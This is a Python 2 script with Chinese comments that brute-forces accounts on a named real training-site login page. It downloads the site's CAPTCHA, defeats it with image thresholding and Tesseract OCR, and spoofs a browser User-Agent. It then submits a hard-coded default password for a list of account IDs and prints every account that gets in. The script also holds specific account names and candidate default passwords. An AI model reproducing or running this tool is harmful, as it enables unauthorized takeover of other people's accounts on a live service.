# encoding: utf-8
__author__ = 'zhanghe'

import requests
from PIL import Image
import pytesseract
import time
import os

# 登录页的url
url = 'http://tts5.tarena.com.cn/user/login'
# 有些网站反爬虫，这里用headers把程序伪装成浏览器
header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36'}
# 登录需要提交的表单
form_data = {
    'loginName': '',
    'password': '',
    'verify': '',
    'login_type': '0'
}

s = requests.session()


def login():
    """
    登录
    :return:
    """
    response = s.post(url, data=form_data, headers=header)
    return response.content


def get_code_img():
    """
    获取验证码并保存为本地图片
    :return:
    """
    img_name = os.path.split(os.path.realpath(__file__))[0] + '/static/verifyCode/' + str(time.time()) + '.jpg'
    img_url = 'http://tts5.tarena.com.cn/verifyCode/getCode.do'
    img_ret = s.get(img_url)
    with open(img_name, 'wb') as f:
        f.write(img_ret.content)
    print img_name
    return img_name


def pretreatment(img_name):
    """
    对图片预处理
    :param img_name:
    :return:
    """
    img = Image.open(img_name)
    # 转化到亮度
    imgry = img.convert('L')
    imgry.save(img_name)
    # 二值化
    threshold = 200  # 阀值
    table = []
    for i in range(256):
        if i < threshold:
            table.append(0)
        else:
            table.append(1)
    out = imgry.point(table, '1')
    out.save(img_name)
    # TODO:待完善


def crop_img(img_name, width=80, height=23, border=1):
    """
    裁剪图片
    :param img_name:
    :param width:
    :param height:
    :param border:
    :return:
    """
    img = Image.open(img_name)
    box = (border, border, width - border*2, height - border*2)
    new_img = img.crop(box)
    new_img.save(img_name)
    return new_img


def optimize(text):
    """
    对于识别成特殊符号的 采用该表进行修正
    :return:
    """
    text = text.strip()
    text = text.upper()
    rep = {
        ' ': '',
        '.': '',
        '\\': '',
        '‘': 'C',
        '$': 'S',
    }
    for r in rep:
        text = text.replace(r, rep[r])
    print text
    return text


def code_img_to_string(img_name):
    img = crop_img(img_name)
    text = pytesseract.image_to_string(img)
    new_text = optimize(text)
    print text
    print new_text
    return new_text


def try_account(id_list, default_pass):
    """
    暴力破解帐号密码
    :param id_list:
    :param default_pass:
    :return:
    """
    code_img_name = get_code_img()
    code_str = code_img_to_string(code_img_name)
    # code_str = code_img_to_string('/home/zhanghe/code/python/getCode.do-2.jpg')
    form_data['password'] = default_pass  # 将密码填入表单
    form_data['verify'] = code_str  # 验证码填入表单
    for id_item in id_list:
        form_data['loginName'] = str(id_item)  # 将用户名填入表单
        result = login()  # 登录，获取返回的 response 结果
        print form_data
        if '<img id="verifyCode" src="/verifyCode/getCode.do"/>' not in result:
            print str(id_item) + "\t" + result  # 打印成功登录的帐号
    pass


if __name__ == "__main__":
    ID_LIST = ['xjhpsd_1']
    # DEFAULT_PASS = "xjhtarena"  # 初始密码
    DEFAULT_PASS = "nstk3aj"  # 初始密码
    try_account(ID_LIST, DEFAULT_PASS)